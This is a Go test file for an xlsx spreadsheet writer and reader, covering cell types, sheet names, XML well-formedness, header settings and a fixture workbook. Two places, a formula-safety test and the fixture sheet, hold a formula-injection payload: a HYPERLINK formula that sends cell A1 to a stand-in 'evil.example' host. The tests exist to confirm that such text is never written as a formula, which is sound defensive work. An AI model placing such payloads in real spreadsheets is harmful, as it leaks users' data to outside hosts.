package xlsx

import (
	"archive/zip"
	"bytes"
	"encoding/xml"
	"io"
	"os"
	"reflect"
	"strings"
	"testing"
	"time"
)

func written(t *testing.T, sheets ...Sheet) []byte {
	t.Helper()
	var buf bytes.Buffer
	if err := Write(&buf, sheets); err != nil {
		t.Fatal(err)
	}
	return buf.Bytes()
}

// part is one part of a written workbook.
func part(t *testing.T, data []byte, name string) string {
	t.Helper()
	z, err := zip.NewReader(bytes.NewReader(data), int64(len(data)))
	if err != nil {
		t.Fatal(err)
	}
	f, err := z.Open(name)
	if err != nil {
		t.Fatalf("%s: %v", name, err)
	}
	b, _ := io.ReadAll(f)
	return string(b)
}

func TestWrittenCellsReadBackAsTheirKinds(t *testing.T) {
	day := time.Date(2024, 3, 5, 0, 0, 0, 0, time.UTC)
	data := written(t, Sheet{Name: "Assets", Rows: [][]Value{
		{TextCell("name"), TextCell("count"), TextCell("price"), TextCell("working"), TextCell("bought"), TextCell("seen")},
		{TextCell("  Saw  "), NumberCell(5), NumberCell(0.1), BoolCell(true), DateCell(day), DateTimeCell(day.Add(12*time.Hour + 30*time.Minute + 15*time.Second))},
		{TextCell("Clamp"), NumberCell(-1234567.25), TextCell(""), BoolCell(false), DateCell(time.Date(2099, 12, 31, 0, 0, 0, 0, time.UTC)), TextCell("")},
	}}, Sheet{Name: "Empty"})
	w, err := Open(data)
	if err != nil {
		t.Fatal(err)
	}
	if !reflect.DeepEqual(w.Sheets, []string{"Assets", "Empty"}) {
		t.Errorf("sheets: %v", w.Sheets)
	}
	rows, err := w.Rows("Assets")
	if err != nil {
		t.Fatal(err)
	}
	want := [][]string{
		{"name", "count", "price", "working", "bought", "seen"},
		{"  Saw  ", "5", "0.1", "true", "2024-03-05", "2024-03-05T12:30:15"},
		// The reader leaves off empty cells at a row's end.
		{"Clamp", "-1234567.25", "", "false", "2099-12-31"},
	}
	if !reflect.DeepEqual(rows, want) {
		t.Errorf("rows:\n got %q\nwant %q", rows, want)
	}
}

func TestTextIsNeverAFormula(t *testing.T) {
	evil := `=HYPERLINK("https://evil.example/?"&A1,"Click")`
	data := written(t, Sheet{Name: "S", Rows: [][]Value{{TextCell("name")}, {TextCell(evil)}, {Guess("+1+1")}, {Guess("@SUM(A1)")}}})
	sheet := part(t, data, "xl/worksheets/sheet1.xml")
	if strings.Contains(sheet, "<f>") || strings.Contains(sheet, "<f ") {
		t.Errorf("a formula was written: %s", sheet)
	}
	w, _ := Open(data)
	rows, _ := w.Rows("S")
	if rows[1][0] != evil || rows[2][0] != "+1+1" || rows[3][0] != "@SUM(A1)" {
		t.Errorf("read back as %q", rows)
	}
}

func TestEveryPartIsWellFormed(t *testing.T) {
	data := written(t, Sheet{Name: `Tools & "Saws" <big>`, Rows: [][]Value{
		{TextCell("a<b>&\"c'")}, {TextCell("bell\x07 and nul\x00 left out\ttab kept\nnewline kept")},
	}})
	z, _ := zip.NewReader(bytes.NewReader(data), int64(len(data)))
	for _, f := range z.File {
		r, _ := f.Open()
		d := xml.NewDecoder(r)
		for {
			if _, err := d.Token(); err == io.EOF {
				break
			} else if err != nil {
				t.Fatalf("%s: %v", f.Name, err)
			}
		}
	}
	w, err := Open(data)
	if err != nil {
		t.Fatal(err)
	}
	rows, _ := w.Rows(`Tools & "Saws" <big>`)
	if rows[1][0] != "bell and nul left out\ttab kept\nnewline kept" {
		t.Errorf("text: %q", rows[1][0])
	}
}

func TestSheetsHaveAFrozenFilteredHeaderAndFittedColumns(t *testing.T) {
	data := written(t, Sheet{Name: "S", Rows: [][]Value{
		{TextCell("id"), TextCell("description")},
		{TextCell("1"), TextCell(strings.Repeat("x", 30))},
		{TextCell("2"), TextCell(strings.Repeat("y", 200))},
	}})
	sheet := part(t, data, "xl/worksheets/sheet1.xml")
	for _, want := range []string{
		`<pane ySplit="1" topLeftCell="A2" activePane="bottomLeft" state="frozen"/>`,
		`<autoFilter ref="A1:B3"/>`,
		`<col min="1" max="1" width="8" customWidth="1"/>`,
		`<col min="2" max="2" width="60" customWidth="1"/>`,
		`<c r="A1" s="1" t="inlineStr">`,
	} {
		if !strings.Contains(sheet, want) {
			t.Errorf("no %s in %s", want, sheet)
		}
	}
	if book := part(t, data, "xl/workbook.xml"); !strings.Contains(book, `localSheetId="0" hidden="1">'S'!$A$1:$B$3</definedName>`) {
		t.Errorf("filter name: %s", book)
	}
}

func TestSheetNames(t *testing.T) {
	taken := map[string]bool{}
	for _, c := range []struct{ in, want string }{
		{"Tools", "Tools"},
		{"tools", "tools (2)"},
		{"Tools", "Tools (3)"},
		{"Saws/Blades: [big]?", "Saws Blades   big"},
		{"'quoted'", "quoted"},
		{"", "Sheet"},
		{strings.Repeat("a", 40), strings.Repeat("a", 31)},
		{strings.Repeat("a", 40), strings.Repeat("a", 27) + " (2)"},
	} {
		if got := SheetName(c.in, taken); got != c.want {
			t.Errorf("SheetName(%q) = %q, want %q", c.in, got, c.want)
		}
	}
}

func TestCellsAreTypedOnlyWhenTheyReadBackTheSame(t *testing.T) {
	for in, want := range map[string]Kind{
		"5": Number, "-0.25": Number, "1234567.5": Number,
		"007": Text, "1.50": Text, "1e3": Text, "+5": Text, "NaN": Text, "": Text, "12345678901234567": Text,
		"2024-03-05": Date, "2024-03-05T12:00:00": DateTime,
		"2024-03-05T12:00:00Z": Text, "2024-02-30": Text, "5 March": Text,
	} {
		if got := Guess(in).Kind; got != want {
			t.Errorf("Guess(%q) is kind %d, want %d", in, got, want)
		}
	}
	// A date before March 1900 is written as text, as Excel's serials for
	// it are off by its mistaken 29 February 1900.
	data := written(t, Sheet{Name: "S", Rows: [][]Value{{TextCell("d")}, {DateCell(time.Date(1900, 2, 28, 0, 0, 0, 0, time.UTC))}, {DateCell(time.Date(1900, 3, 1, 0, 0, 0, 0, time.UTC))}}})
	w, _ := Open(data)
	rows, _ := w.Rows("S")
	if rows[1][0] != "1900-02-28" || rows[2][0] != "1900-03-01" {
		t.Errorf("early dates: %q", rows)
	}
	if !strings.Contains(part(t, data, "xl/worksheets/sheet1.xml"), `<c r="A2" t="inlineStr">`) {
		t.Error("1900-02-28 was not written as text")
	}
}

// fixtureSheets are written to testdata/written.xlsx, the workbook checked
// by opening it in spreadsheets (testdata/README.md).
func fixtureSheets() []Sheet {
	day := time.Date(2024, 3, 5, 0, 0, 0, 0, time.UTC)
	return []Sheet{
		{Name: "All", Rows: [][]Value{
			{TextCell("id"), TextCell("name"), TextCell("field.watts"), TextCell("field.bought"), TextCell("field.checked"), TextCell("working")},
			{TextCell("a1"), TextCell(`=HYPERLINK("https://evil.example","Click")`), NumberCell(750), DateCell(day), DateTimeCell(day.Add(13*time.Hour + 5*time.Minute)), BoolCell(true)},
			{TextCell("a2"), TextCell("Clamp, café ☕"), NumberCell(0.1), TextCell("1899-12-31"), TextCell(""), BoolCell(false)},
			{TextCell("a3"), TextCell("Saw\nwith a newline"), TextCell("007"), DateCell(time.Date(1900, 3, 1, 0, 0, 0, 0, time.UTC)), TextCell(""), TextCell("")},
		}},
		{Name: "Tools › Saws", Rows: [][]Value{{TextCell("id"), TextCell("name")}, {TextCell("a3"), TextCell("Saw")}}},
	}
}

func TestTheCheckedWorkbookIsWhatIsWritten(t *testing.T) {
	data := written(t, fixtureSheets()...)
	if os.Getenv("BAM_UPDATE_FIXTURES") != "" {
		if err := os.WriteFile("testdata/written.xlsx", data, 0o644); err != nil {
			t.Fatal(err)
		}
	}
	want, err := os.ReadFile("testdata/written.xlsx")
	if err != nil {
		t.Fatal(err)
	}
	if !bytes.Equal(data, want) {
		t.Error("the writer's output has changed: check it opens in Excel and LibreOffice, then run with BAM_UPDATE_FIXTURES=1 (testdata/README.md)")
	}
}
